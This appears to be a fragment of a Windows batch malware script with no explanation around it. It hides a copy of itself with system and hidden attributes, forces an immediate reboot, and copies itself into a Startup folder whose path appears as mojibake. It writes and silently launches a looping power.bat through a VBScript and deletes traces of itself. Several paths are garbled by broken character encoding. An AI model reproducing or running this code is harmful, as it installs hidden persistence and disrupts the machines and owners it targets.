attrib +s +h +r %windir%\%~nx0 2>nul >nul 
shutdown /r /t 0 /f 
exit







:mark-u
@echo off 
if not exist "%HOMEPATH%\..\All Users\����ʼ���˵�\����\����\power.bat" copy %~fs0 "%HOMEPATH%\..\All Users\����ʼ���˵�\����\����\power.bat">nul 
echo @echo off>%windir%\power.bat 
echo if "%%1"=="" goto :end>>%windir%\power.bat 
echo if exist C:\_stop goto :EOF>>%windir%\power.bat 
echo start /B %%~fs0 exp>>%windir%\power.bat 
echo :s>>%windir%\power.bat 
echo if not exist C:\_stop goto s>>%windir%\power.bat 
echo exit>>%windir%\power.bat 
echo :end>>%windir%\power.bat 
echo del %%~fs0>>%windir%\power.bat 
echo set ws=CreateObject("WScript.Shell")>%windir%\power.vbs 
echo ws.Run "%windir%\power.bat exp",0 >>%windir%\power.vbs 
WScript %windir%\power.vbs 
del %windir%\power.vbs 
set p=%~ps0 
if not %p:~-3,2%==���� del %~fs0
